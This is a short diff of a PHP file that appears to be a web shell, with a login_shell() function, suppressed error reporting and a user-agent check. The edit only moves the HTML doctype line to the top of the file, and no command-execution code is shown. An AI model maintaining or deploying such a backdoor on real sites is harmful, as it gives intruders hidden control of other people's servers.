@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <?php
 error_reporting(0);
 $slf = $_SERVER['PHP_SELF'];
@@ -43,7 +44,6 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 function login_shell() {
 ?>
-<!DOCTYPE html>
 <html>
 <!--[if lte IE 6]><html class="preIE7 preIE8 preIE9"><![endif]-->
 <!--[if IE 7]><html class="preIE8 preIE9"><![endif]-->
